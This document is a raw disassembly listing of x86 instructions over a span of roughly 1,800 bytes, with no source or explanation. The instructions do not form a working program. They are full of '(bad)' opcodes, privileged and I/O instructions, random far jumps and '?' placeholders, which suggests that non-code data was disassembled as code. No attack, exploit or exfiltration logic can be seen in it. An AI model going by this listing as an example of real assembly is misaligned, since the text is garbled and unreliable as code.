  6a86f8:	cmp    al,al
  6a86fa:	popf   
  6a86fb:	cld    
  6a86fc:	adc    DWORD PTR [ebx],0x7d2c1bb6
  6a8702:	mov    al,0x1d
  6a8704:	fs jecxz 0x6a86d9
  6a8707:	xor    al,0x5d
  6a8709:	push   ecx
  6a870a:	cmp    BYTE PTR [eax-0x53],0x9f
  6a870e:	fwait
  6a870f:	jne    0x6a8731
  6a8711:	mov    eax,ds:0x2962c654
  6a8716:	sbb    bh,0xe1
  6a8719:	cwde   
  6a871a:	jns    0x6a8753
  6a871c:	mov    WORD PTR [ebx+0x43],?
  6a871f:	ret    
  6a8720:	pop    ss
  6a8721:	sub    bh,dh
  6a8723:	popf   
  6a8724:	ins    BYTE PTR es:[edi],dx
  6a8725:	sahf   
  6a8726:	mov    eax,ds:0xc7b0371f
  6a872b:	add    bl,BYTE PTR [ebx-0x2d]
  6a872e:	lods   eax,DWORD PTR ds:[esi]
  6a872f:	mov    BYTE PTR [eax],ah
  6a8731:	push   esp
  6a8732:	mov    ch,0x7c
  6a8734:	outs   dx,BYTE PTR ds:[esi]
  6a8735:	loopne 0x6a873c
  6a8737:	cmc    
  6a8738:	xor    al,0x4e
  6a873a:	add    eax,0x42e02b7
  6a873f:	sbb    al,0x25
  6a8741:	and    eax,0x411ac976
  6a8746:	xchg   edi,eax
  6a8747:	std    
  6a8748:	add    DWORD PTR [ecx],edx
  6a874a:	mov    esi,0xb8f0fd83
  6a874f:	pop    es
  6a8750:	xor    eax,0xd9139ab8
  6a8755:	xchg   BYTE PTR [edx],dl
  6a8757:	xchg   ebx,eax
  6a8758:	mov    BYTE PTR [eax+0x2d7c81bf],cl
  6a875e:	dec    ecx
  6a875f:	xor    dl,BYTE PTR [ecx+0x7b6a13ca]
  6a8765:	ins    DWORD PTR es:[edi],dx
  6a8766:	inc    edx
  6a8767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a8768:	stos   BYTE PTR es:[edi],al
  6a8769:	xchg   DWORD PTR [ebx+0x1fdb7f22],edi
  6a876f:	or     al,0xc0
  6a8771:	mov    al,ds:0x277fbb1f
  6a8776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a8777:	push   ds
  6a8778:	and    al,0xa1
  6a877a:	mov    ds:0x7fe48199,al
  6a877f:	std    
  6a8780:	mov    al,ds:0xa1bf63ce
  6a8785:	push   esi
  6a8786:	mov    dl,0x69
  6a8788:	mov    ss,WORD PTR [ecx+0x1a]
  6a878b:	loop   0x6a8738
  6a878d:	cmp    eax,0xcc381b13
  6a8792:	pop    ss
  6a8793:	out    0x41,eax
  6a8795:	push   cs
  6a8796:	ret    
  6a8797:	retf   0xee8
  6a879a:	or     DWORD PTR [esi],edi
  6a879c:	retf   0x7d9f
  6a879f:	fwait
  6a87a0:	cmp    ch,BYTE PTR [esi+0x1f]
  6a87a3:	xchg   ecx,eax
  6a87a4:	xchg   edx,eax
  6a87a5:	or     ch,BYTE PTR [ebx-0x4a99e6d9]
  6a87ab:	ror    BYTE PTR [esp+ebx*4],1
  6a87ae:	mov    edi,DWORD PTR [edx]
  6a87b0:	aad    0x84
  6a87b2:	inc    esp
  6a87b3:	lds    eax,FWORD PTR [ebx]
  6a87b5:	jecxz  0x6a8768
  6a87b7:	cs icebp 
  6a87b9:	xor    dh,BYTE PTR [edi+eax*2-0xf]
  6a87bd:	adc    DWORD PTR [ecx+0x58],ecx
  6a87c0:	mov    DWORD PTR [edx],0xe28d8c8b
  6a87c6:	cmp    bh,BYTE PTR [ebx+0x1]
  6a87c9:	hlt    
  6a87ca:	push   ecx
  6a87cb:	cmp    al,BYTE PTR [ecx+edi*1+0x22]
  6a87cf:	cmp    DWORD PTR [edi*8+0x633d0141],ebp
  6a87d6:	cmp    eax,0xfd57bb3f
  6a87db:	jne    0x6a879e
  6a87dd:	cld    
  6a87de:	push   ebx
  6a87df:	sti    
  6a87e0:	sub    BYTE PTR [esi],bh
  6a87e2:	add    BYTE PTR [ecx-0x7b],0x1e
  6a87e6:	ins    BYTE PTR es:[edi],dx
  6a87e7:	mov    dh,0xb4
  6a87e9:	popf   
  6a87ea:	hlt    
  6a87eb:	mov    dh,0xba
  6a87ed:	mov    al,ds:0xd951b1db
  6a87f2:	sbb    eax,0xc502b76f
  6a87f7:	ins    DWORD PTR es:[edi],dx
  6a87f8:	xchg   ebp,esi
  6a87fa:	cmp    edx,DWORD PTR ds:0x5cdbbbe0
  6a8800:	jecxz  0x6a87e1
  6a8802:	pop    ds
  6a8803:	fild   WORD PTR [esi+0x4653d137]
  6a8809:	mov    eax,ds:0xa51d6f8f
  6a880e:	inc    esi
  6a880f:	push   0x3ff2e490
  6a8814:	xor    al,0x1c
  6a8816:	cwde   
  6a8817:	mov    esp,ds
  6a8819:	rcl    bh,1
  6a881b:	mov    al,0xd4
  6a881d:	inc    ebp
  6a881e:	icebp  
  6a881f:	pop    edx
  6a8820:	(bad)  
  6a8821:	sbb    ebp,DWORD PTR [esi+0xdfe3433]
  6a8827:	push   ebp
  6a8828:	imul   edx,DWORD PTR [ebp+0x1b],0xf24639c
  6a882f:	pop    edx
  6a8830:	pop    esi
  6a8831:	lods   eax,DWORD PTR ds:[esi]
  6a8832:	mov    esp,0x4ef8ed1a
  6a8837:	sbb    BYTE PTR [ebp-0x21],0xc9
  6a883b:	dec    edx
  6a883c:	push   0xffffffac
  6a883e:	cli    
  6a883f:	scas   al,BYTE PTR es:[edi]
  6a8840:	out    dx,al
  6a8841:	in     al,0x65
  6a8843:	ror    cl,1
  6a8845:	inc    esp
  6a8846:	adc    DWORD PTR [eax],eax
  6a8848:	push   ebx
  6a8849:	bound  edi,QWORD PTR [edi-0x2c5f4f4e]
  6a884f:	mov    ebp,0x68dc6236
  6a8854:	jge    0x6a88aa
  6a8856:	push   eax
  6a8857:	sar    BYTE PTR [ebx],cl
  6a8859:	pop    ebx
  6a885a:	cmp    eax,0x826e277d
  6a885f:	xchg   ecx,eax
  6a8860:	mov    esi,0x11abffc4
  6a8865:	repnz enter 0xa31c,0xed
  6a886a:	hlt    
  6a886b:	out    dx,eax
  6a886c:	mov    bh,0x43
  6a886e:	stos   BYTE PTR es:[edi],al
  6a886f:	mov    ebp,0x76e691e2
  6a8874:	sbb    ebp,DWORD PTR [eax+0x35]
  6a8877:	lods   al,BYTE PTR ds:[esi]
  6a8878:	inc    edi
  6a8879:	retf   
  6a887a:	(bad)  
  6a887b:	aam    0x77
  6a887d:	mov    al,0x2e
  6a887f:	inc    edx
  6a8880:	push   ebp
  6a8881:	mov    dl,0x6b
  6a8883:	adc    eax,0xb26e3447
  6a8888:	and    al,BYTE PTR [edi+esi*8-0x75]
  6a888c:	jecxz  0x6a890d
  6a888e:	sbb    bh,bh
  6a8890:	pusha  
  6a8891:	mov    BYTE PTR [ebp-0x304446cd],ah
  6a8897:	aad    0x40
  6a8899:	pop    ebp
  6a889a:	loopne 0x6a88cf
  6a889c:	inc    edi
  6a889d:	push   edx
  6a889e:	and    ebx,DWORD PTR [ebp+0x25]
  6a88a1:	lock pop esp
  6a88a3:	mov    eax,ds:0xa726237a
  6a88a8:	sbb    ecx,DWORD PTR [esi+0x540b4777]
  6a88ae:	jle    0x6a8897
  6a88b0:	ins    BYTE PTR es:[edi],dx
  6a88b1:	push   edi
  6a88b2:	pop    es
  6a88b3:	xchg   esp,eax
  6a88b4:	xor    BYTE PTR [esi-0x2b],ah
  6a88b7:	popf   
  6a88b8:	push   0xa9b879d3
  6a88bd:	mov    esi,0x2f757da2
  6a88c2:	push   eax
  6a88c3:	push   ecx
  6a88c4:	repnz adc al,0xf7
  6a88c7:	fmul   st(2),st
  6a88c9:	(bad)  
  6a88ca:	(bad)  
  6a88cb:	ds ds pop eax
  6a88ce:	jmp    0xd993661
  6a88d3:	in     eax,0x31
  6a88d5:	(bad)  
  6a88d6:	sar    cl,cl
  6a88d8:	(bad)  
  6a88d9:	and    ebx,DWORD PTR [edi]
  6a88db:	enter  0xec2a,0x3
  6a88df:	hlt    
  6a88e0:	pop    eax
  6a88e1:	mov    WORD PTR [ebx-0x64],?
  6a88e4:	out    0x27,eax
  6a88e6:	cld    
  6a88e7:	call   0x35bb:0x4766aec6
  6a88ee:	ret    0x8258
  6a88f1:	xchg   esp,eax
  6a88f2:	adc    BYTE PTR [eax+0x76],cl
  6a88f5:	ds jae 0x6a88e6
  6a88f8:	xchg   edx,eax
  6a88f9:	fcom   DWORD PTR [eax+0x2c7cfe22]
  6a88ff:	pop    edx
  6a8900:	jnp    0x6a890e
  6a8902:	aam    0x6a
  6a8904:	adc    edi,edx
  6a8906:	pmullw mm4,QWORD PTR [edx+0x41]
  6a890a:	mov    edx,0x41ca4074
  6a890f:	repnz sbb al,0xea
  6a8912:	out    dx,eax
  6a8913:	call   0xfbb8:0xb97c7d4
  6a891a:	inc    ecx
  6a891b:	jno    0x6a8944
  6a891d:	js     0x6a8937
  6a891f:	jno    0x6a898a
  6a8921:	adc    DWORD PTR [edx-0x21],esp
  6a8924:	fsubr  DWORD PTR [ecx+ebp*8+0x1325aea8]
  6a892b:	aaa    
  6a892c:	jle    0x6a8978
  6a892e:	pop    eax
  6a892f:	pop    ss
  6a8930:	stos   DWORD PTR es:[edi],eax
  6a8931:	lea    esi,[ecx-0x115a22e9]
  6a8937:	push   0x945df260
  6a893c:	or     al,0x29
  6a893e:	ja     0x6a892a
  6a8940:	dec    ebp
  6a8941:	jge    0x6a8962
  6a8943:	int    0xd8
  6a8945:	push   ebx
  6a8946:	sbb    ch,bl
  6a8948:	rcr    ch,0xa1
  6a894b:	out    dx,al
  6a894c:	adc    BYTE PTR [edi-0x50],0xd9
  6a8950:	add    al,BYTE PTR [edi]
  6a8952:	mov    DWORD PTR [edi],edi
  6a8954:	stos   BYTE PTR es:[edi],al
  6a8955:	or     ch,BYTE PTR [eax-0x199e4e03]
  6a895b:	int3   
  6a895c:	sub    al,0x48
  6a895e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a895f:	adc    ebp,DWORD PTR [edi+0x3a]
  6a8962:	outs   dx,BYTE PTR ds:[esi]
  6a8963:	aad    0x2b
  6a8965:	icebp  
  6a8966:	imul   DWORD PTR [edi]
  6a8968:	mov    edi,0x8bab2c81
  6a896d:	outs   dx,DWORD PTR ds:[esi]
  6a896e:	push   0x5c
  6a8970:	(bad)  
  6a8971:	out    0xdd,al
  6a8973:	dec    edi
  6a8974:	pop    edi
  6a8975:	bound  esi,QWORD PTR [esi+0x5536d652]
  6a897b:	jo     0x6a895b
  6a897d:	imul   edx,DWORD PTR [eax],0xefe036a8
  6a8983:	(bad)  
  6a8985:	pop    ds
  6a8986:	cmp    bh,BYTE PTR ds:0x5622e50
  6a898c:	shl    BYTE PTR [ecx-0x1d],0x8d
  6a8990:	mov    al,ds:0x59c2ca16
  6a8995:	aad    0x55
  6a8997:	popa   
  6a8998:	xchg   ebp,eax
  6a8999:	shl    cl,cl
  6a899b:	or     ah,BYTE PTR [edi-0x6f]
  6a899e:	mov    esp,0x6c1fa963
  6a89a3:	add    dh,ah
  6a89a5:	test   eax,0x8ec59d26
  6a89aa:	inc    edx
  6a89ab:	push   0xa31de42f
  6a89b0:	std    
  6a89b1:	aam    0xae
  6a89b3:	sbb    DWORD PTR [edi+esi*2+0x10ac9649],edi
  6a89ba:	inc    edx
  6a89bb:	in     al,dx
  6a89bc:	sbb    BYTE PTR [edx+ecx*2],dh
  6a89bf:	test   eax,0x97912474
  6a89c4:	cli    
  6a89c5:	and    eax,0x356d40
  6a89ca:	mov    ds:0xd2fbd1d4,eax
  6a89cf:	xchg   DWORD PTR [eax-0x54],ecx
  6a89d2:	daa    
  6a89d3:	mov    WORD PTR [eax],ss
  6a89d5:	cwde   
  6a89d6:	adc    eax,0xc8f7fa5a
  6a89db:	(bad)  
  6a89dc:	std    
  6a89dd:	loope  0x6a8a35
  6a89df:	adc    al,dh
  6a89e1:	xlat   BYTE PTR gs:[ebx]
  6a89e3:	xchg   ah,bh
  6a89e5:	sbb    dl,BYTE PTR [ebp-0x236ab809]
  6a89eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a89ec:	loope  0x6a8a1f
  6a89ee:	lods   al,BYTE PTR ds:[esi]
  6a89ef:	sbb    BYTE PTR [edx],0x22
  6a89f2:	push   esp
  6a89f3:	es mov eax,0xc39de942
  6a89f9:	stc    
  6a89fa:	cmp    BYTE PTR [edx+ecx*2+0x49],al
  6a89fe:	mov    edx,0xed995f22
  6a8a03:	fsubr  QWORD PTR [ebp+0x3263af0b]
  6a8a09:	call   0xf5ee7f65
  6a8a0e:	test   eax,0x5ad84bed
  6a8a13:	repnz rcr DWORD PTR [ebp-0x20],1
  6a8a17:	ss cmp eax,ecx
  6a8a1a:	mov    bh,0xa3
  6a8a1c:	xor    dl,bh
  6a8a1e:	cdq    
  6a8a1f:	mov    ecx,0x7ddcf578
  6a8a24:	jle    0x6a89f1
  6a8a26:	sar    DWORD PTR [edi-0x3eeccb57],1
  6a8a2c:	pop    edx
  6a8a2d:	ja     0x6a8a68
  6a8a2f:	pop    eax
  6a8a30:	sub    eax,0x8a31e744
  6a8a35:	(bad)  
  6a8a36:	sbb    bh,dh
  6a8a38:	hlt    
  6a8a39:	mov    al,0x9d
  6a8a3b:	inc    ebx
  6a8a3c:	scas   eax,DWORD PTR es:[edi]
  6a8a3d:	pop    ebp
  6a8a3e:	and    al,0xf3
  6a8a40:	or     al,0xa1
  6a8a42:	cmp    bh,BYTE PTR [edi]
  6a8a44:	push   esp
  6a8a45:	mov    ebp,0x173d7fc0
  6a8a4a:	mov    ecx,0x7219f421
  6a8a4f:	std    
  6a8a50:	jne    0x6a8a66
  6a8a52:	cld    
  6a8a53:	xor    edi,eax
  6a8a55:	icebp  
  6a8a56:	sbb    al,0x83
  6a8a58:	xor    eax,0x7d15ac2
  6a8a5d:	or     BYTE PTR [esp+esi*1],bl
  6a8a60:	jbe    0x6a8a74
  6a8a62:	bound  edi,QWORD PTR [ebx+eax*1-0x2b044f27]
  6a8a69:	repnz dec ecx
  6a8a6b:	mov    DWORD PTR [ebx],edi
  6a8a6d:	xchg   ebx,eax
  6a8a6e:	rcl    DWORD PTR [edi],0x81
  6a8a71:	and    al,BYTE PTR [edi+0x557f2170]
  6a8a77:	inc    eax
  6a8a78:	lods   al,BYTE PTR ds:[esi]
  6a8a79:	cmp    esp,DWORD PTR [edx-0x24]
  6a8a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a8a7d:	jae    0x6a8a4e
  6a8a7f:	(bad)  
  6a8a80:	popa   
  6a8a81:	xchg   DWORD PTR ds:0x21ef954b,eax
  6a8a87:	ficom  WORD PTR [edx-0x239175a2]
  6a8a8d:	push   eax
  6a8a8e:	jo     0x6a8a4c
  6a8a90:	mov    eax,0xcc72e5ba
  6a8a95:	pop    ss
  6a8a96:	add    bh,BYTE PTR ds:[ecx-0x26]
  6a8a9a:	xor    eax,0xa6c38f04
  6a8a9f:	loop   0x6a8aff
  6a8aa1:	jge    0x6a8a23
  6a8aa3:	ds ins BYTE PTR es:[edi],dx
  6a8aa5:	inc    edi
  6a8aa6:	mov    bh,0xf3
  6a8aa8:	pop    esi
  6a8aa9:	adc    eax,0xe03544cc
  6a8aae:	xchg   ebp,eax
  6a8aaf:	dec    esi
  6a8ab0:	jle    0x6a8a8f
  6a8ab2:	xchg   DWORD PTR [eax+0x2146a5b9],ecx
  6a8ab8:	push   eax
  6a8ab9:	jmp    0x6a8a8b
  6a8abb:	cmp    al,0xda
  6a8abd:	add    al,0xc6
  6a8abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a8ac0:	and    esp,DWORD PTR [edx-0x40e24ac1]
  6a8ac6:	jnp    0x6a8abf
  6a8ac8:	pop    ecx
  6a8ac9:	pop    ss
  6a8aca:	ror    eax,0xfa
  6a8acd:	pop    eax
  6a8ace:	dec    ecx
  6a8acf:	cld    
  6a8ad0:	repz jp 0x6a8ace
  6a8ad3:	mov    al,ds:0xe8eac6d5
  6a8ad8:	sub    bh,BYTE PTR [ebx-0x5]
  6a8adb:	xchg   BYTE PTR [ebx+eiz*2],ah
  6a8ade:	lea    esi,[eax+0x50]
  6a8ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a8ae2:	(bad)  
  6a8ae3:	test   al,0xa
  6a8ae5:	jmp    0x421:0x53d78cf6
  6a8aec:	stos   DWORD PTR es:[edi],eax
  6a8aed:	pop    edx
  6a8aee:	mov    fs,WORD PTR [edx+0x53bcaaf9]
  6a8af4:	sbb    dl,0x72
  6a8af7:	mov    WORD PTR [ebx],fs
  6a8af9:	jnp    0x6a8ad7
  6a8afb:	and    al,0x96
  6a8afd:	jge    0x6a8b22
  6a8aff:	fs jno 0x6a8b39
  6a8b02:	in     al,dx
  6a8b03:	(bad)  [esi+0x45]
  6a8b06:	jmp    0x6a8b81
  6a8b08:	inc    edi
  6a8b09:	stc    
  6a8b0a:	loop   0x6a8ae9
  6a8b0c:	into   
  6a8b0d:	sub    al,0x33
  6a8b0f:	push   0x45c658f6
  6a8b14:	int3   
  6a8b15:	dec    ebx
  6a8b16:	rcl    DWORD PTR [eax],cl
  6a8b18:	add    eax,0x731479d2
  6a8b1d:	dec    ecx
  6a8b1e:	out    0xbf,al
  6a8b20:	mov    cl,0xa7
  6a8b22:	clc    
  6a8b23:	out    dx,eax
  6a8b24:	imul   esi,esp,0x63
  6a8b27:	push   es
  6a8b28:	es (bad) 
  6a8b2a:	xchg   esi,eax
  6a8b2b:	data16 (bad) 
  6a8b2d:	ret    0x43f
  6a8b30:	pop    ss
  6a8b31:	cmp    eax,0xf8085e4c
  6a8b36:	ins    BYTE PTR es:[edi],dx
  6a8b37:	sub    bl,BYTE PTR [edi+0x9a7063d]
  6a8b3d:	pop    ecx
  6a8b3e:	cmp    al,0x30
  6a8b40:	inc    esi
  6a8b41:	aam    0xf
  6a8b43:	test   DWORD PTR [esi+eiz*8-0x7616ea1b],edx
  6a8b4a:	mov    bh,0xd7
  6a8b4c:	(bad)  
  6a8b4d:	and    DWORD PTR [ebx+0x7c],ecx
  6a8b50:	mov    ds:0x7970582f,al
  6a8b55:	add    ah,BYTE PTR ds:[esi]
  6a8b58:	call   0x374e21fe
  6a8b5d:	dec    esp
  6a8b5e:	ret    0xeaa2
  6a8b61:	clc    
  6a8b62:	xor    ah,BYTE PTR [edi+0x6b195b35]
  6a8b68:	es xchg ebx,eax
  6a8b6a:	xor    DWORD PTR [eax],eax
  6a8b6c:	ror    BYTE PTR [edi],cl
  6a8b6e:	sbb    bh,bl
  6a8b70:	jecxz  0x6a8bc2
  6a8b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a8b73:	lods   al,BYTE PTR ds:[esi]
  6a8b74:	enter  0x64c,0x82
  6a8b78:	repz dec ebx
  6a8b7a:	out    dx,al
  6a8b7b:	out    dx,al
  6a8b7c:	lods   eax,DWORD PTR ds:[esi]
  6a8b7d:	sbb    ah,BYTE PTR [ebp-0x1fd3f95f]
  6a8b83:	inc    dl
  6a8b85:	jge    0x6a8b27
  6a8b87:	rcl    esi,cl
  6a8b89:	sub    BYTE PTR [ebx+0x1e663f86],cl
  6a8b8f:	pop    esp
  6a8b90:	mov    ds:0xff9adba1,al
  6a8b95:	(bad)  
  6a8b96:	out    dx,eax
  6a8b97:	mov    ecx,0x5d07af30
  6a8b9c:	lahf   
  6a8b9d:	cmp    BYTE PTR [edi-0x43b90b9f],dh
  6a8ba3:	mov    cs,WORD PTR [ebp+ebx*1+0x58]
  6a8ba7:	test   bh,0x46
  6a8baa:	sub    al,0xca
  6a8bac:	repz gs sahf 
  6a8baf:	jle    0x6a8bcf
  6a8bb1:	int3   
  6a8bb2:	pop    ebx
  6a8bb3:	repnz and esp,edi
  6a8bb6:	sub    esp,0xcfb23776
  6a8bbc:	fdivr  DWORD PTR [edi]
  6a8bbe:	popa   
  6a8bbf:	ins    BYTE PTR es:[edi],dx
  6a8bc0:	push   edi
  6a8bc1:	enter  0x8b92,0x71
  6a8bc5:	outs   dx,DWORD PTR ds:[esi]
  6a8bc6:	jno    0x6a8bb0
  6a8bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a8bc9:	lock mov ds:0xc7381a65,al
  6a8bcf:	xchg   esi,ebx
  6a8bd1:	jnp    0x6a8c46
  6a8bd3:	fst    DWORD PTR [ebx]
  6a8bd5:	xchg   ebx,eax
  6a8bd6:	vmptrld QWORD PTR [edi]
  6a8bd9:	inc    ebx
  6a8bda:	mov    ecx,0x3c7ba140
  6a8bdf:	dec    ecx
  6a8be0:	jg     0x6a8c16
  6a8be2:	cld    
  6a8be3:	or     al,BYTE PTR [esi+ecx*2-0x35]
  6a8be7:	mov    ecx,0x12ee5844
  6a8bec:	aaa    
  6a8bed:	xchg   ebp,eax
  6a8bee:	or     BYTE PTR [edx-0x12eaabd8],dh
  6a8bf4:	lods   al,BYTE PTR ds:[esi]
  6a8bf5:	out    dx,al
  6a8bf6:	mov    dh,0x34
  6a8bf8:	push   0xea6231b8
  6a8bfd:	in     al,0xc3
  6a8bff:	stos   BYTE PTR es:[edi],al
  6a8c00:	sti    
  6a8c01:	ins    DWORD PTR es:[edi],dx
  6a8c02:	popa   
  6a8c03:	sub    edi,esi
  6a8c05:	shl    BYTE PTR [esi-0x11],cl
  6a8c08:	jmp    0x6a8c54
  6a8c0a:	test   eax,0x73f1731a
  6a8c0f:	mov    es,WORD PTR [esi]
  6a8c11:	or     eax,0x53bf979a
  6a8c16:	or     ch,ch
  6a8c18:	pushf  
  6a8c19:	(bad)  
  6a8c1a:	(bad)  
  6a8c1b:	arpl   si,dx
  6a8c1d:	(bad)  
  6a8c1e:	ins    DWORD PTR es:[edi],dx
  6a8c1f:	and    al,BYTE PTR [edi+0x5e]
  6a8c22:	xor    DWORD PTR [ebx-0x1],edi
  6a8c25:	js     0x6a8bc6
  6a8c27:	lea    eax,[ebx+eax*4-0x5f95d3df]
  6a8c2e:	inc    esi
  6a8c2f:	push   0x63
  6a8c31:	imul   edi,DWORD PTR [ebx-0x68958184],0x15b45758
  6a8c3b:	sub    DWORD PTR [edx+0x1a4dc8fd],esi
  6a8c41:	mov    gs,WORD PTR [ecx+eax*4]
  6a8c44:	mov    dh,0x6d
  6a8c46:	or     BYTE PTR [ebx+0x2b],0xa9
  6a8c4a:	stos   DWORD PTR es:[edi],eax
  6a8c4b:	push   ebp
  6a8c4c:	jmp    0x43e8:0x94055012
  6a8c53:	int3   
  6a8c54:	test   eax,0x444812e5
  6a8c59:	in     eax,dx
  6a8c5a:	fidiv  DWORD PTR [ecx]
  6a8c5c:	dec    ebp
  6a8c5d:	rsm    
  6a8c5f:	cmp    ebp,esi
  6a8c61:	xchg   edi,eax
  6a8c62:	lds    ebx,FWORD PTR [ecx-0x73ed4acf]
  6a8c68:	xor    ecx,esi
  6a8c6a:	mov    ebp,ss
  6a8c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a8c6d:	xchg   ecx,eax
  6a8c6e:	js     0x6a8cd8
  6a8c70:	jmp    0x5010:0xd699947
  6a8c77:	inc    ecx
  6a8c78:	test   eax,0xa816909
  6a8c7d:	and    bh,BYTE PTR [edi-0x7aa89597]
  6a8c83:	ins    BYTE PTR es:[edi],dx
  6a8c84:	mov    dh,dl
  6a8c86:	repz enter 0x2314,0xa0
  6a8c8b:	aaa    
  6a8c8c:	in     eax,dx
  6a8c8d:	bound  edx,QWORD PTR [edx+ecx*8]
  6a8c90:	add    dh,dl
  6a8c92:	aam    0xfc
  6a8c94:	push   ecx
  6a8c95:	add    eax,0x88de99bc
  6a8c9a:	leave  
  6a8c9b:	aam    0x66
  6a8c9d:	mov    ebx,DWORD PTR [ebx+edi*8]
  6a8ca0:	sub    DWORD PTR [ebx],esp
  6a8ca2:	or     al,0xdf
  6a8ca4:	inc    esi
  6a8ca5:	dec    ecx
  6a8ca6:	inc    edi
  6a8ca7:	push   ds
  6a8ca8:	and    eax,0x6df1d816
  6a8cad:	ds nop
  6a8caf:	sub    ecx,DWORD PTR [ebp+0xed2999b]
  6a8cb5:	jmp    0x1e0f5e63
  6a8cba:	mov    edx,0x8cdbda3f
  6a8cbf:	inc    edi
  6a8cc0:	in     al,dx
  6a8cc1:	pushf  
  6a8cc2:	mov    ah,0x95
  6a8cc4:	push   edi
  6a8cc5:	dec    edx
  6a8cc6:	push   DWORD PTR [ebp+0x58]
  6a8cc9:	clc    
  6a8cca:	call   0x5f30:0xa7ecb09a
  6a8cd1:	cwde   
  6a8cd2:	push   cs
  6a8cd3:	pop    ss
  6a8cd4:	sti    
  6a8cd5:	test   al,0x3f
  6a8cd7:	and    al,0x47
  6a8cd9:	gs ret 0xb87b
  6a8cdd:	xlat   BYTE PTR ds:[ebx]
  6a8cde:	cmp    BYTE PTR [ebx],ch
  6a8ce0:	jnp    0x11b099da
  6a8ce6:	jp     0x6a8d33
  6a8ce8:	sbb    esi,edi
  6a8cea:	mul    al
  6a8cec:	ds dec edi
  6a8cee:	inc    ebx
  6a8cef:	inc    edx
  6a8cf0:	add    DWORD PTR [ebx+0x4],edx
  6a8cf3:	pop    edi
  6a8cf4:	scas   al,BYTE PTR es:[edi]
  6a8cf5:	add    ecx,DWORD PTR [eax-0x26]
  6a8cf8:	cmp    ebx,0x68
  6a8cfb:	push   ss
  6a8cfc:	sbb    DWORD PTR [ebx+0x27bffd95],0x3d
  6a8d03:	and    al,0x27
  6a8d05:	add    ebp,DWORD PTR ss:0xff5c944
  6a8d0c:	dec    edi
  6a8d0d:	mov    WORD PTR [esi+edx*1-0xf],es
  6a8d11:	xchg   ebx,eax
  6a8d12:	pop    ebp
  6a8d13:	add    dl,ch
  6a8d15:	dec    eax
  6a8d16:	inc    edi
  6a8d17:	xor    eax,0x6869d14b
  6a8d1c:	or     ebx,DWORD PTR [edx]
  6a8d1e:	xor    al,0x47
  6a8d20:	out    0xb,eax
  6a8d22:	xchg   esi,eax
  6a8d23:	xor    dl,BYTE PTR [esi+0x69]
  6a8d26:	sbb    BYTE PTR [ecx],al
  6a8d28:	jno    0x6a8d87
  6a8d2a:	fadd   DWORD PTR [ebx+0x62]
  6a8d2d:	push   ds
  6a8d2e:	push   ecx
  6a8d2f:	lds    eax,FWORD PTR [eax+0x15]
  6a8d32:	add    al,0x6d
  6a8d34:	int3   
  6a8d35:	xor    eax,0x37cf24a2
  6a8d3a:	leave  
  6a8d3b:	adc    BYTE PTR [ebx],al
  6a8d3d:	push   0xff50047a
  6a8d42:	xchg   esi,eax
  6a8d43:	out    dx,al
  6a8d44:	in     al,0x3e
  6a8d46:	mov    ah,BYTE PTR [esi+eiz*8-0x57540e58]
  6a8d4d:	dec    ecx
  6a8d4e:	fstp   DWORD PTR [edi-0x112d79c3]
  6a8d54:	aas    
  6a8d55:	int3   
  6a8d56:	push   esi
  6a8d57:	fidivr WORD PTR [esi-0x34]
  6a8d5a:	add    esp,DWORD PTR [eax]
  6a8d5c:	aad    0x85
  6a8d5e:	div    BYTE PTR [ecx-0x60]
  6a8d61:	in     eax,0x2b
  6a8d63:	cdq    
  6a8d64:	icebp  
  6a8d65:	mov    BYTE PTR [eax-0x48],ch
  6a8d68:	in     al,dx
  6a8d69:	(bad)  
  6a8d6a:	fucom  st(3)
  6a8d6c:	pop    esi
  6a8d6d:	sub    eax,0x8a904ec3
  6a8d72:	ins    DWORD PTR es:[edi],dx
  6a8d73:	pop    edi
  6a8d74:	jmp    0xd3411c4
  6a8d79:	je     0x6a8d19
  6a8d7b:	pushf  
  6a8d7c:	jne    0x6a8d7c
  6a8d7e:	or     BYTE PTR [edx+ecx*8+0x591ee122],ah
  6a8d85:	stc    
  6a8d86:	inc    esp
  6a8d87:	cld    
  6a8d88:	push   edx
  6a8d89:	in     al,dx
  6a8d8a:	xchg   BYTE PTR [ebp-0x5a24c8f6],bl
  6a8d90:	fsubrp st(3),st
  6a8d92:	push   edi
  6a8d93:	cmp    BYTE PTR [eax-0x686c54b7],bl
  6a8d99:	jmp    DWORD PTR [ebx+esi*1]
  6a8d9c:	clc    
  6a8d9d:	daa    
  6a8d9e:	jnp    0x6a8e1e
  6a8da0:	sbb    BYTE PTR [eax],0x62
  6a8da3:	popf   
  6a8da4:	or     al,BYTE PTR [edi+0x72]
  6a8da7:	ror    ch,cl
  6a8da9:	stos   DWORD PTR es:[edi],eax
  6a8daa:	mov    bl,0x96
  6a8dac:	push   ecx
  6a8dad:	mov    dh,BYTE PTR [edx+ebp*8+0x4f]
  6a8db1:	mov    eax,ds:0xc3bc920a
  6a8db6:	jns    0x6a8d69
  6a8db8:	pop    ss
  6a8db9:	fisttp QWORD PTR [eax]
  6a8dbb:	mov    esp,0x808d5e5d
  6a8dc0:	into   
  6a8dc1:	mul    esp
  6a8dc3:	inc    ebp
  6a8dc4:	and    ebx,esp
  6a8dc6:	cli    
  6a8dc7:	xor    al,0x37
  6a8dc9:	sbb    eax,0x5bf79112
  6a8dce:	mov    al,0x68
  6a8dd0:	mov    bh,0xe1
  6a8dd2:	popf   
  6a8dd3:	push   di
  6a8dd5:	outs   dx,BYTE PTR ds:[esi]
  6a8dd6:	fs in  eax,dx
  6a8dd8:	adc    al,0xb6
  6a8dda:	rcl    BYTE PTR [ebp+eiz*2+0x4e],1
  6a8dde:	jnp    0x6a8e0b
  6a8de0:	and    cl,ch
  6a8de2:	add    cl,BYTE PTR [eax+0x471e3bf3]
  6a8de8:	test   al,0xbd
  6a8dea:	jno    0x6a8d6c
  6a8dec:	ds je  0x6a8da4
  6a8def:	cli    
  6a8df0:	xor    al,0xd9
  6a8df2:	pop    esp
